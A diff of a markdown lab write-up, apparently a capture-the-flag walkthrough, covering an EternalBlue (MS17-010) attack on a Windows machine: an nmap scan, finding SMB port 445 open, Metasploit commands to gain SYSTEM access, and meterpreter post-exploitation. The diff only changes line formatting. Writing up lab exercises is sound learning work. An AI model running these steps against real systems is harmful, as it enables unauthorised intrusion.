@@ -10,12 +10,12 @@ The objective was to exploit a Windows machine vulnerable to the EternalBlue (MS
     'bash
     'nmap -A -T4 <target_ip>
 
-Discovered port 445 (SMB) was open.
+-Discovered port 445 (SMB) was open.
 
 #Step 2: Exploiting EternalBlue (MS17-010)
 
-The open SMB port suggested the machine was vulnerable to EternalBlue, a well-known exploit for Windows.
-    Used Metasploit to exploit the vulnerability:
+-The open SMB port suggested the machine was vulnerable to EternalBlue, a well-known exploit for Windows.
+-Used Metasploit to exploit the vulnerability:
 
     'bash
     'msfconsole
@@ -23,11 +23,11 @@ The open SMB port suggested the machine was vulnerable to EternalBlue, a well-kn
     'set RHOST <target_ip>
     'exploit
 
-        Successfully gained SYSTEM access on the target machine.
+-Successfully gained SYSTEM access on the target machine.
 
 #Step 3: Post-Exploitation
 
-After gaining access, listed users and explored the system for flags using meterpreter.
+-After gaining access, listed users and explored the system for flags using meterpreter.
 
     'bash
     'meterpreter > sysinfo
